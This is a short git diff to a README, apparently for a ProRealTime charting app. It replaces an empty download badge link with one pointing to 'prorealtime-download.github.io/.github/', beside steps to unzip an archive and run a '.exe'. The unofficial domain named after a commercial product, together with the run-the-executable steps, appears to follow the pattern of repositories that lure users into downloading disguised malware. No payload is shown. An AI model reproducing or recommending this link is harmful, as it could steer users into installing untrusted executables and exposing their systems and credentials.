@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://prorealtime-download.github.io/.github/)
 
 ## 📸 Overview
 ![prorealtime-advanced-charting](https://github.com/user-attachments/assets/8ae60869-3279-4fd1-920f-cdddddafb064)
